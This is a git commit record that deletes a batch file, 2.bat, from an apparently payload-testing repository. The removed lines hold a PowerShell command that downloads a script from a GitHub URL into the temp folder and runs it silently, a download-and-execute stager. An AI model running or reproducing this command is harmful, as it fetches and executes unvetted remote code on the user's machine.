9704076336e79c837f8f3f151fc9f29a323cee0d
YimuQr <161135845+YimuQrrr@users.noreply.github.com>
2024-09-14 02:09:07 +0900

    Delete 2.bat

--- 2.bat
+++
@@ -1,2 +0,0 @@
-@echo off
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/YimuQrrr/PowerShell_Payloads_Test/blob/a269e297ef7af4fc372d9a88b17fa9546f68dd19/1.ps1' -OutFile '%TEMP%\1.ps1'; Start-Process powershell -ArgumentList '-File %TEMP%\1.ps1' -NoNewWindow -Wait"
